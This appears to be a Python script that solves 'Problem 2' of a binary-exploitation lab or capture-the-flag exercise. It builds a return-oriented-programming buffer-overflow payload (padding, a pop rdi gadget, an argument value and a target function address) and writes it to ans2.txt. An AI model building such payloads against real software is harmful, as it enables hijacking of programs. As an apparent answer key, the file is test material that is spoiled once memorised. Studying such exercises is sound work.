# build_payload2.py
padding = b'A' * 16
pop_rdi_addr = b'\xc7\x12\x40\x00\x00\x00\x00\x00' # 0x4012c7
arg_value = b'\xf8\x03\x00\x00\x00\x00\x00\x00'    # 0x3f8 (1016)
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'  # 0x401216

payload = padding + pop_rdi_addr + arg_value + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 2 has been written to ans2.txt")